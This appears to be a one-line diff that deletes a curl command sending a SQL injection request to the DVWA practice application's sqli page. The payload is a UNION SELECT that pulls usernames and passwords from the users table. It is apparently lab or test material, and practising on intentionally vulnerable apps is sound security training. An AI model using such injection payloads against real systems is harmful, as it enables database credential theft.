@@ -1,1 +1,0 @@
-curl -sS -o /dev/null -w "HTTP %{http_code}\n" "$DVWA_URL/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--&Submit=Submit"
